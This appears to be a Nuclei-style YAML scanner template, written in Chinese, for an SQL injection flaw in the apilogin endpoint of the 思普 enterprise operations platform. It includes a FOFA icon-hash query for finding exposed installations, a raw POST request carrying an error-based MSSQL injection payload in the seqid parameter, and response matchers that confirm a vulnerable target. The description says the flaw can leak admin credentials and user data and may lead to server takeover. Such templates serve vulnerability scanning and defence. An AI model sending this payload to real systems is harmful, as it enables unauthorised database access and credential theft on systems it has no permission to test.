id: sipu-apilogin-sql

info:
  name: 思普企业运营管理平台 apilogin 接口SQL注入漏洞
  author: Unknown
  severity: high
  description: |-
    fofa: icon_hash="-403479360"
      思普企业运营管理平台 apilogin 接口存在SQL注入漏洞。攻击者可通过构造恶意SQL语句实现数据库敏感信息泄露，包括但不限于管理员后台凭证及用户隐私数据。在特定权限条件下，该漏洞可能被利用实施服务器端恶意文件写入操作，最终达成系统权限接管目的。
  reference:
  - https://mp.weixin.qq.com/s/mOXC1DErdD6IaIQd2ydeOA?token=962101535&lang=zh_CN
  tags: 思普企业运营管理平台


http:
- raw:
  - |
    POST /IdsCenter/idsCheck?p=apilogin HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0

    seqid=1%27+AND+6884+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%286884%3D6884%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29--+cxaC&datasource=EOMP1
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - 'qjqpq1qpqqq'
    - '转换成数据类型 int 时失败'
    condition: and
  - type: status
    status:
    - 200
